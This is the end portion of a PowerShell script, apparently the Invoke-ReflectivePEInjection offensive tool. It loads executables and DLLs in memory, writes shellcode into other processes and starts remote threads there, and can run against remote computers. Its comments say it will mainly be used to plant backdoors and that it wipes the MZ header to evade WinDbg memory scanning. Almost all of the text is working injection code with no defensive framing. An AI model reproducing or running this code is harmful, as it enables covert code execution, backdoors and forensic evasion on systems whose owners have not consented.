                $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
                
                $DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
            }
            else
            {
                $DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            
                if ($PEInfo.PE64Bit -eq $true)
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                }
                else
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                }
                $SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
                $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
                $SCPSMemOriginal = $SCPSMem
                
                Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
                
                $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                if ($RSCAddr -eq [IntPtr]::Zero)
                {
                    Throw "Unable to allocate memory in the remote process for shellcode"
                }
                
                $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
                if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
                {
                    Throw "Unable to write shellcode to remote process memory."
                }

                $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
                $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
                if ($Result -ne 0)
                {
                    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
                }
                
                $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            }
        }
        elseif ($PEInfo.FileType -ieq "EXE")
        {
            #Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
            [IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
            [System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
            $OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

            #If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
            # This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
            [IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

            $Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

            while($true)
            {
                [Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
                if ($ThreadDone -eq 1)
                {
                    Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
                    Write-Verbose "EXE thread has completed."
                    break
                }
                else
                {
                    Start-Sleep -Seconds 1
                }
            }
        }
        
        return @($PEInfo.PEHandle, $EffectivePEHandle)
    }
    
    
    Function Invoke-MemoryFreeLibrary
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $PEHandle
        )
        
        #Get Win32 constants and functions
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        
        #Call FreeLibrary for all the imports of the DLL
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
                
                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done unloading the libraries needed by the PE"
                    break
                }

                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
                $ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

                if ($ImportDllHandle -eq $null)
                {
                    Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
                }
                
                $Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
                if ($Success -eq $false)
                {
                    Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
                }
                
                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
        
        #Call DllMain with process detach
        Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
        $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
        $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
        $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
        
        $DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
        
        
        $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
        if ($Success -eq $false)
        {
            Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
        }
    }


    Function Main
    {
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        $Win32Constants =  Get-Win32Constants
        
        $RemoteProcHandle = [IntPtr]::Zero
    
        #If a remote process to inject in to is specified, get a handle to it
        if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
        {
            Throw "Can't supply a ProcId and ProcName, choose one or the other"
        }
        elseif ($ProcName -ne $null -and $ProcName -ne "")
        {
            $Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
            if ($Processes.Count -eq 0)
            {
                Throw "Can't find process $ProcName"
            }
            elseif ($Processes.Count -gt 1)
            {
                $ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
                Write-Output $ProcInfo
                Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
            }
            else
            {
                $ProcId = $Processes[0].ID
            }
        }
        
        #Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
        #If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
# if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
# {
# Write-Verbose "Getting SeDebugPrivilege"
# Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
# }
        
        if (($ProcId -ne $null) -and ($ProcId -ne 0))
        {
            $RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
            if ($RemoteProcHandle -eq [IntPtr]::Zero)
            {
                Throw "Couldn't obtain the handle for process ID: $ProcId"
            }
            
            Write-Verbose "Got the handle for the remote process to inject in to"
        }
        

        #Load the PE reflectively
        Write-Verbose "Calling Invoke-MemoryLoadLibrary"
        $PEHandle = [IntPtr]::Zero
        if ($RemoteProcHandle -eq [IntPtr]::Zero)
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
        }
        else
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
        }
        if ($PELoadedInfo -eq [IntPtr]::Zero)
        {
            Throw "Unable to load PE, handle returned is NULL"
        }
        
        $PEHandle = $PELoadedInfo[0]
        $RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
        
        
        #Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
        {
            #########################################
            ### YOUR CODE GOES HERE
            #########################################
            switch ($FuncReturnType)
            {
                'WString' {
                    Write-Verbose "Calling function with WString return type"
                    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
                    if ($WStringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
                    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
                    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
                    Write-Output $Output
                }

                'String' {
                    Write-Verbose "Calling function with String return type"
                    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
                    if ($StringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
                    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
                    [IntPtr]$OutputPtr = $StringFunc.Invoke()
                    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
                    Write-Output $Output
                }

                'Void' {
                    Write-Verbose "Calling function with Void return type"
                    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
                    if ($VoidFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $VoidFuncDelegate = Get-DelegateType @() ([Void])
                    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
                    $VoidFunc.Invoke() | Out-Null
                }
            }
            #########################################
            ### END OF YOUR CODE
            #########################################
        }
        #For remote DLL injection, call a void function which takes no parameters
        elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
            if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
            {
                Throw "VoidFunc couldn't be found in the DLL"
            }
            
            $VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
            $VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
            
            #Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
            $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
        }
        
        #Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
        if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
        {
            Invoke-MemoryFreeLibrary -PEHandle $PEHandle
        }
        else
        {
            #Delete the PE file from memory.
            $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
            if ($Success -eq $false)
            {
                Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
            }
        }
        
        Write-Verbose "Done!"
    }

    Main
}

#Main function to either run the script locally or remotely
Function Main
{
    if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
    {
        $DebugPreference  = "Continue"
    }
    
    Write-Verbose "PowerShell ProcessID: $PID"
    
    #Verify the image is a valid PE file
    $e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

    if (-not $DoNotZeroMZ) {
        # Remove 'MZ' from the PE file so that it cannot be detected by .imgscan in WinDbg
        # TODO: Investigate how much of the header can be destroyed, I'd imagine most of it can be.
        $PEBytes[0] = 0
        $PEBytes[1] = 0
    }
    
    #Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
    if ($ExeArgs -ne $null -and $ExeArgs -ne '')
    {
        $ExeArgs = "ReflectiveExe $ExeArgs"
    }
    else
    {
        $ExeArgs = "ReflectiveExe"
    }

    if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
    }
    else
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
    }
}

Main
}

# Convert base64 string to byte array
 
#$PEBytes = [System.Convert]::FromBase64String($InputString)
 
# Run EXE in memory
 
Invoke-ReflectivePEInjection -PEBytes $PEBytes # -ExeArgs "Arg1 Arg2 Arg3 Arg4"
}
